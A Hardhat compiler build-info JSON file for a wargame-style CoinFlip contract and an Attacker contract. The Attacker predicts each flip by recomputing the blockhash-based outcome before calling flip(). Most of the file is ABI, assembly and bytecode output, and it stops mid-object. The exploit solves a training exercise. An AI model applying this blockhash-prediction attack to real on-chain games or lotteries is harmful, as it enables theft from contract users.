{
	"id": "22692a13f97ab4ab01f8c0b10a1d337d",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.28",
	"solcLongVersion": "0.8.28+commit.7893614a",
	"input": {
		"language": "Solidity",
		"sources": {
			"tests/test03.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/level03.sol\";\n\ncontract Attacker\n{\n    uint256 lastHash;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    CoinFlip level;\n    constructor(address _level)\n    {\n        level = CoinFlip(_level);\n    }\n\n    function exploit() external \n    {\n            uint256 blockValue = uint256(blockhash(block.number - 1));\n            if (lastHash == blockValue) {\n            revert();\n            }\n\n            lastHash = blockValue;\n            uint256 coinFlip = blockValue / FACTOR;\n            bool side = coinFlip == 1 ? true : false;\n\n            if (side == true)\n            {\n                level.flip(true);\n            }\n            else\n            {\n                level.flip(false);\n            }\n        }   \n}"
			},
			"src/level03.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract CoinFlip {\n\n  uint256 public consecutiveWins;\n  uint256 lastHash;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n  constructor() {\n    consecutiveWins = 0;\n  }\n\n  function flip(bool _guess) public returns (bool) {\n    uint256 blockValue = uint256(blockhash(block.number - 1));\n\n    if (lastHash == blockValue) {\n      revert();\n    }\n\n    lastHash = blockValue;\n    uint256 coinFlip = blockValue / FACTOR;\n    bool side = coinFlip == 1 ? true : false;\n\n    if (side == _guess) {\n      consecutiveWins++;\n      return true;\n    } else {\n      consecutiveWins = 0;\n      return false;\n    }\n  }\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"src/level03.sol": {
				"CoinFlip": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "consecutiveWins",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "bool",
									"name": "_guess",
									"type": "bool"
								}
							],
							"name": "flip",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"src/level03.sol\":57:712  contract CoinFlip {... */\n  mstore(0x40, 0x80)\n    /* \"src/level03.sol\":151:228  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"src/level03.sol\":134:228  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x02\n  sstore\n    /* \"src/level03.sol\":233:277  constructor() {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n    /* \"src/level03.sol\":271:272  0 */\n  0x00\n    /* \"src/level03.sol\":253:268  consecutiveWins */\n  0x00\n    /* \"src/level03.sol\":253:272  consecutiveWins = 0 */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"src/level03.sol\":57:712  contract CoinFlip {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"src/level03.sol\":57:712  contract CoinFlip {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1d263f67\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xe6f334d7\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"src/level03.sol\":281:710  function flip(bool _guess) public returns (bool) {... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      tag_8\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"src/level03.sol\":80:110  uint256 public consecutiveWins */\n    tag_4:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"src/level03.sol\":281:710  function flip(bool _guess) public returns (bool) {... */\n    tag_8:\n        /* \"src/level03.sol\":324:328  bool */\n      0x00\n        /* \"src/level03.sol\":336:354  uint256 blockValue */\n      0x00\n        /* \"src/level03.sol\":390:391  1 */\n      0x01\n        /* \"src/level03.sol\":375:387  block.number */\n      number\n        /* \"src/level03.sol\":375:391  block.number - 1 */\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n        /* \"src/level03.sol\":365:392  blockhash(block.number - 1) */\n      blockhash\n        /* \"src/level03.sol\":357:393  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"src/level03.sol\":336:393  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"src/level03.sol\":416:426  blockValue */\n      dup1\n        /* \"src/level03.sol\":404:412  lastHash */\n      sload(0x01)\n        /* \"src/level03.sol\":404:426  lastHash == blockValue */\n      sub\n        /* \"src/level03.sol\":400:451  if (lastHash == blockValue) {... */\n      tag_18\n      jumpi\n        /* \"src/level03.sol\":436:444  revert() */\n      revert(0x00, 0x00)\n        /* \"src/level03.sol\":400:451  if (lastHash == blockValue) {... */\n    tag_18:\n        /* \"src/level03.sol\":468:478  blockValue */\n      dup1\n        /* \"src/level03.sol\":457:465  lastHash */\n      0x01\n        /* \"src/level03.sol\":457:478  lastHash = blockValue */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"src/level03.sol\":484:500  uint256 coinFlip */\n      0x00\n        /* \"src/level03.sol\":516:522  FACTOR */\n      sload(0x02)\n        /* \"src/level03.sol\":503:513  blockValue */\n      dup3\n        /* \"src/level03.sol\":503:522  blockValue / FACTOR */\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n        /* \"src/level03.sol\":484:522  uint256 coinFlip = blockValue / FACTOR */\n      swap1\n      pop\n        /* \"src/level03.sol\":528:537  bool side */\n      0x00\n        /* \"src/level03.sol\":552:553  1 */\n      0x01\n        /* \"src/level03.sol\":540:548  coinFlip */\n      dup3\n        /* \"src/level03.sol\":540:553  coinFlip == 1 */\n      eq\n        /* \"src/level03.sol\":540:568  coinFlip == 1 ? true : false */\n      tag_21\n      jumpi\n        /* \"src/level03.sol\":563:568  false */\n      0x00\n        /* \"src/level03.sol\":540:568  coinFlip == 1 ? true : false */\n      jump(tag_22)\n    tag_21:\n        /* \"src/level03.sol\":556:560  true */\n      0x01\n        /* \"src/level03.sol\":540:568  coinFlip == 1 ? true : false */\n    tag_22:\n        /* \"src/level03.sol\":528:568  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"src/level03.sol\":587:593  _guess */\n      dup5\n        /* \"src/level03.sol\":579:593  side == _guess */\n      iszero\n      iszero\n        /* \"src/level03.sol\":579:583  side */\n      dup2\n        /* \"src/level03.sol\":579:593  side == _guess */\n      iszero\n      iszero\n      sub\n        /* \"src/level03.sol\":575:706  if (side == _guess) {... */\n      tag_23\n      jumpi\n        /* \"src/level03.sol\":603:618  consecutiveWins */\n      0x00\n      0x00\n        /* \"src/level03.sol\":603:620  consecutiveWins++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      tag_24\n      swap1\n      tag_25\n      jump\t// in\n    tag_24:\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"src/level03.sol\":635:639  true */\n      0x01\n        /* \"src/level03.sol\":628:639  return true */\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump(tag_15)\n        /* \"src/level03.sol\":575:706  if (side == _guess) {... */\n    tag_23:\n        /* \"src/level03.sol\":678:679  0 */\n      0x00\n        /* \"src/level03.sol\":660:675  consecutiveWins */\n      0x00\n        /* \"src/level03.sol\":660:679  consecutiveWins = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"src/level03.sol\":694:699  false */\n      0x00\n        /* \"src/level03.sol\":687:699  return false */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"src/level03.sol\":281:710  function flip(bool _guess) public returns (bool) {... */\n    tag_15:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"src/level03.sol\":80:110  uint256 public consecutiveWins */\n    tag_12:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_28:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      0x00\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:424   */\n    tag_30:\n        /* \"#utility.yul\":368:375   */\n      0x00\n        /* \"#utility.yul\":411:416   */\n      dup2\n        /* \"#utility.yul\":404:417   */\n      iszero\n        /* \"#utility.yul\":397:418   */\n      iszero\n        /* \"#utility.yul\":386:418   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:424   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":430:546   */\n    tag_31:\n        /* \"#utility.yul\":500:521   */\n      tag_44\n        /* \"#utility.yul\":515:520   */\n      dup2\n        /* \"#utility.yul\":500:521   */\n      tag_30\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":493:498   */\n      dup2\n        /* \"#utility.yul\":490:522   */\n      eq\n        /* \"#utility.yul\":480:540   */\n      tag_45\n      jumpi\n        /* \"#utility.yul\":536:537   */\n      0x00\n        /* \"#utility.yul\":533:534   */\n      0x00\n        /* \"#utility.yul\":526:538   */\n      revert\n        /* \"#utility.yul\":480:540   */\n    tag_45:\n        /* \"#utility.yul\":430:546   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":552:685   */\n    tag_32:\n        /* \"#utility.yul\":595:600   */\n      0x00\n        /* \"#utility.yul\":633:639   */\n      dup2\n        /* \"#utility.yul\":620:640   */\n      calldataload\n        /* \"#utility.yul\":611:640   */\n      swap1\n      pop\n        /* \"#utility.yul\":649:679   */\n      tag_47\n        /* \"#utility.yul\":673:678   */\n      dup2\n        /* \"#utility.yul\":649:679   */\n      tag_31\n      jump\t// in\n    tag_47:\n        /* \"#utility.yul\":552:685   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":691:1014   */\n    tag_7:\n        /* \"#utility.yul\":747:753   */\n      0x00\n        /* \"#utility.yul\":796:798   */\n      0x20\n        /* \"#utility.yul\":784:793   */\n      dup3\n        /* \"#utility.yul\":775:782   */\n      dup5\n        /* \"#utility.yul\":771:794   */\n      sub\n        /* \"#utility.yul\":767:799   */\n      slt\n        /* \"#utility.yul\":764:883   */\n      iszero\n      tag_49\n      jumpi\n        /* \"#utility.yul\":802:881   */\n      tag_50\n      tag_28\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":764:883   */\n    tag_49:\n        /* \"#utility.yul\":922:923   */\n      0x00\n        /* \"#utility.yul\":947:997   */\n      tag_51\n        /* \"#utility.yul\":989:996   */\n      dup5\n        /* \"#utility.yul\":980:986   */\n      dup3\n        /* \"#utility.yul\":969:978   */\n      dup6\n        /* \"#utility.yul\":965:987   */\n      add\n        /* \"#utility.yul\":947:997   */\n      tag_32\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":937:997   */\n      swap2\n      pop\n        /* \"#utility.yul\":893:1007   */\n      pop\n        /* \"#utility.yul\":691:1014   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1020:1129   */\n    tag_33:\n        /* \"#utility.yul\":1101:1122   */\n      tag_53\n        /* \"#utility.yul\":1116:1121   */\n      dup2\n        /* \"#utility.yul\":1101:1122   */\n      tag_30\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":1096:1099   */\n      dup3\n        /* \"#utility.yul\":1089:1123   */\n      mstore\n        /* \"#utility.yul\":1020:1129   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1135:1345   */\n    tag_10:\n        /* \"#utility.yul\":1222:1226   */\n      0x00\n        /* \"#utility.yul\":1260:1262   */\n      0x20\n        /* \"#utility.yul\":1249:1258   */\n      dup3\n        /* \"#utility.yul\":1245:1263   */\n      add\n        /* \"#utility.yul\":1237:1263   */\n      swap1\n      pop\n        /* \"#utility.yul\":1273:1338   */\n      tag_55\n        /* \"#utility.yul\":1335:1336   */\n      0x00\n        /* \"#utility.yul\":1324:1333   */\n      dup4\n        /* \"#utility.yul\":1320:1337   */\n      add\n        /* \"#utility.yul\":1311:1317   */\n      dup5\n        /* \"#utility.yul\":1273:1338   */\n      tag_33\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":1135:1345   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1351:1428   */\n    tag_34:\n        /* \"#utility.yul\":1388:1395   */\n      0x00\n        /* \"#utility.yul\":1417:1422   */\n      dup2\n        /* \"#utility.yul\":1406:1422   */\n      swap1\n      pop\n        /* \"#utility.yul\":1351:1428   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1434:1552   */\n    tag_35:\n        /* \"#utility.yul\":1521:1545   */\n      tag_58\n        /* \"#utility.yul\":1539:1544   */\n      dup2\n        /* \"#utility.yul\":1521:1545   */\n      tag_34\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":1516:1519   */\n      dup3\n        /* \"#utility.yul\":1509:1546   */\n      mstore\n        /* \"#utility.yul\":1434:1552   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1558:1780   */\n    tag_14:\n        /* \"#utility.yul\":1651:1655   */\n      0x00\n        /* \"#utility.yul\":1689:1691   */\n      0x20\n        /* \"#utility.yul\":1678:1687   */\n      dup3\n        /* \"#utility.yul\":1674:1692   */\n      add\n        /* \"#utility.yul\":1666:1692   */\n      swap1\n      pop\n        /* \"#utility.yul\":1702:1773   */\n      tag_60\n        /* \"#utility.yul\":1770:1771   */\n      0x00\n        /* \"#utility.yul\":1759:1768   */\n      dup4\n        /* \"#utility.yul\":1755:1772   */\n      add\n        /* \"#utility.yul\":1746:1752   */\n      dup5\n        /* \"#utility.yul\":1702:1773   */\n      tag_35\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":1558:1780   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1786:1966   */\n    tag_36:\n        /* \"#utility.yul\":1834:1911   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1831:1832   */\n      0x00\n        /* \"#utility.yul\":1824:1912   */\n      mstore\n        /* \"#utility.yul\":1931:1935   */\n      0x11\n        /* \"#utility.yul\":1928:1929   */\n      0x04\n        /* \"#utility.yul\":1921:1936   */\n      mstore\n        /* \"#utility.yul\":1955:1959   */\n      0x24\n        /* \"#utility.yul\":1952:1953   */\n      0x00\n        /* \"#utility.yul\":1945:1960   */\n      revert\n        /* \"#utility.yul\":1972:2166   */\n    tag_17:\n        /* \"#utility.yul\":2012:2016   */\n      0x00\n        /* \"#utility.yul\":2032:2052   */\n      tag_63\n        /* \"#utility.yul\":2050:2051   */\n      dup3\n        /* \"#utility.yul\":2032:2052   */\n      tag_34\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":2027:2052   */\n      swap2\n      pop\n        /* \"#utility.yul\":2066:2086   */\n      tag_64\n        /* \"#utility.yul\":2084:2085   */\n      dup4\n        /* \"#utility.yul\":2066:2086   */\n      tag_34\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":2061:2086   */\n      swap3\n      pop\n        /* \"#utility.yul\":2110:2111   */\n      dup3\n        /* \"#utility.yul\":2107:2108   */\n      dup3\n        /* \"#utility.yul\":2103:2112   */\n      sub\n        /* \"#utility.yul\":2095:2112   */\n      swap1\n      pop\n        /* \"#utility.yul\":2134:2135   */\n      dup2\n        /* \"#utility.yul\":2128:2132   */\n      dup2\n        /* \"#utility.yul\":2125:2136   */\n      gt\n        /* \"#utility.yul\":2122:2159   */\n      iszero\n      tag_65\n      jumpi\n        /* \"#utility.yul\":2139:2157   */\n      tag_66\n      tag_36\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":2122:2159   */\n    tag_65:\n        /* \"#utility.yul\":1972:2166   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2172:2352   */\n    tag_37:\n        /* \"#utility.yul\":2220:2297   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2217:2218   */\n      0x00\n        /* \"#utility.yul\":2210:2298   */\n      mstore\n        /* \"#utility.yul\":2317:2321   */\n      0x12\n        /* \"#utility.yul\":2314:2315   */\n      0x04\n        /* \"#utility.yul\":2307:2322   */\n      mstore\n        /* \"#utility.yul\":2341:2345   */\n      0x24\n        /* \"#utility.yul\":2338:2339   */\n      0x00\n        /* \"#utility.yul\":2331:2346   */\n      revert\n        /* \"#utility.yul\":2358:2543   */\n    tag_20:\n        /* \"#utility.yul\":2398:2399   */\n      0x00\n        /* \"#utility.yul\":2415:2435   */\n      tag_69\n        /* \"#utility.yul\":2433:2434   */\n      dup3\n        /* \"#utility.yul\":2415:2435   */\n      tag_34\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":2410:2435   */\n      swap2\n      pop\n        /* \"#utility.yul\":2449:2469   */\n      tag_70\n        /* \"#utility.yul\":2467:2468   */\n      dup4\n        /* \"#utility.yul\":2449:2469   */\n      tag_34\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":2444:2469   */\n      swap3\n      pop\n        /* \"#utility.yul\":2488:2489   */\n      dup3\n        /* \"#utility.yul\":2478:2513   */\n      tag_71\n      jumpi\n        /* \"#utility.yul\":2493:2511   */\n      tag_72\n      tag_37\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":2478:2513   */\n    tag_71:\n        /* \"#utility.yul\":2535:2536   */\n      dup3\n        /* \"#utility.yul\":2532:2533   */\n      dup3\n        /* \"#utility.yul\":2528:2537   */\n      div\n        /* \"#utility.yul\":2523:2537   */\n      swap1\n      pop\n        /* \"#utility.yul\":2358:2543   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2549:2782   */\n    tag_25:\n        /* \"#utility.yul\":2588:2591   */\n      0x00\n        /* \"#utility.yul\":2611:2635   */\n      tag_74\n        /* \"#utility.yul\":2629:2634   */\n      dup3\n        /* \"#utility.yul\":2611:2635   */\n      tag_34\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":2602:2635   */\n      swap2\n      pop\n        /* \"#utility.yul\":2657:2723   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":2650:2655   */\n      dup3\n        /* \"#utility.yul\":2647:2724   */\n      sub\n        /* \"#utility.yul\":2644:2747   */\n      tag_75\n      jumpi\n        /* \"#utility.yul\":2727:2745   */\n      tag_76\n      tag_36\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":2644:2747   */\n    tag_75:\n        /* \"#utility.yul\":2774:2775   */\n      0x01\n        /* \"#utility.yul\":2767:2772   */\n      dup3\n        /* \"#utility.yul\":2763:2776   */\n      add\n        /* \"#utility.yul\":2756:2776   */\n      swap1\n      pop\n        /* \"#utility.yul\":2549:2782   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220979f4f4c66a4c684c8a9118e997d5035ce92f824c739ccddec30d6067e22124f64736f6c634300081c0033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_16": {
									"entryPoint": null,
									"id": 16,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [],
							"linkReferences": {},
							"object": "60806040527f80000000000000000000000000000000000000000000000000000000000000006002553480156032575f5ffd5b505f5f8190555061030e806100465f395ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c80631d263f6714610038578063e6f334d714610068575b5f5ffd5b610052600480360381019061004d9190610150565b610086565b60405161005f919061018a565b60405180910390f35b610070610112565b60405161007d91906101bb565b60405180910390f35b5f5f6001436100959190610201565b405f1c905080600154036100a7575f5ffd5b806001819055505f600254826100bd9190610261565b90505f600182146100ce575f6100d1565b60015b905084151581151503610100575f5f8154809291906100ef90610291565b91905055506001935050505061010d565b5f5f819055505f93505050505b919050565b5f5481565b5f5ffd5b5f8115159050919050565b61012f8161011b565b8114610139575f5ffd5b50565b5f8135905061014a81610126565b92915050565b5f6020828403121561016557610164610117565b5b5f6101728482850161013c565b91505092915050565b6101848161011b565b82525050565b5f60208201905061019d5f83018461017b565b92915050565b5f819050919050565b6101b5816101a3565b82525050565b5f6020820190506101ce5f8301846101ac565b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61020b826101a3565b9150610216836101a3565b925082820390508181111561022e5761022d6101d4565b5b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61026b826101a3565b9150610276836101a3565b92508261028657610285610234565b5b828204905092915050565b5f61029b826101a3565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036102cd576102cc6101d4565b5b60018201905091905056fea2646970667358221220979f4f4c66a4c684c8a9118e997d5035ce92f824c739ccddec30d6067e22124f64736f6c634300081c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x2 SSTORE CALLVALUE DUP1 ISZERO PUSH1 0x32 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH0 PUSH0 DUP2 SWAP1 SSTORE POP PUSH2 0x30E DUP1 PUSH2 0x46 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x34 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x38 JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x68 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x52 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x4D SWAP2 SWAP1 PUSH2 0x150 JUMP JUMPDEST PUSH2 0x86 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5F SWAP2 SWAP1 PUSH2 0x18A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x70 PUSH2 0x112 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x7D SWAP2 SWAP1 PUSH2 0x1BB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 PUSH0 PUSH1 0x1 NUMBER PUSH2 0x95 SWAP2 SWAP1 PUSH2 0x201 JUMP JUMPDEST BLOCKHASH PUSH0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD SUB PUSH2 0xA7 JUMPI PUSH0 PUSH0 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH0 PUSH1 0x2 SLOAD DUP3 PUSH2 0xBD SWAP2 SWAP1 PUSH2 0x261 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH1 0x1 DUP3 EQ PUSH2 0xCE JUMPI PUSH0 PUSH2 0xD1 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO SUB PUSH2 0x100 JUMPI PUSH0 PUSH0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0xEF SWAP1 PUSH2 0x291 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x10D JUMP JUMPDEST PUSH0 PUSH0 DUP2 SWAP1 SSTORE POP PUSH0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 SLOAD DUP2 JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x12F DUP2 PUSH2 0x11B JUMP JUMPDEST DUP2 EQ PUSH2 0x139 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x14A DUP2 PUSH2 0x126 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x165 JUMPI PUSH2 0x164 PUSH2 0x117 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x172 DUP5 DUP3 DUP6 ADD PUSH2 0x13C JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x184 DUP2 PUSH2 0x11B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x19D PUSH0 DUP4 ADD DUP5 PUSH2 0x17B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1B5 DUP2 PUSH2 0x1A3 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1CE PUSH0 DUP4 ADD DUP5 PUSH2 0x1AC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x20B DUP3 PUSH2 0x1A3 JUMP JUMPDEST SWAP2 POP PUSH2 0x216 DUP4 PUSH2 0x1A3 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x22E JUMPI PUSH2 0x22D PUSH2 0x1D4 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x26B DUP3 PUSH2 0x1A3 JUMP JUMPDEST SWAP2 POP PUSH2 0x276 DUP4 PUSH2 0x1A3 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x286 JUMPI PUSH2 0x285 PUSH2 0x234 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x29B DUP3 PUSH2 0x1A3 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x2CD JUMPI PUSH2 0x2CC PUSH2 0x1D4 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP8 SWAP16 0x4F 0x4C PUSH7 0xA4C684C8A9118E SWAP10 PUSH30 0x5035CE92F824C739CCDDEC30D6067E22124F64736F6C634300081C003300 ",
							"sourceMap": "57:655:0:-:0;;;151:77;134:94;;233:44;;;;;;;;;;271:1;253:15;:19;;;;57:655;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@consecutiveWins_3": {
									"entryPoint": 274,
									"id": 3,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@flip_80": {
									"entryPoint": 134,
									"id": 80,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_decode_t_bool": {
									"entryPoint": 316,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_bool": {
									"entryPoint": 336,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_bool_to_t_bool_fromStack": {
									"entryPoint": 379,
									"id": null,
									"parameterSlots": 2,
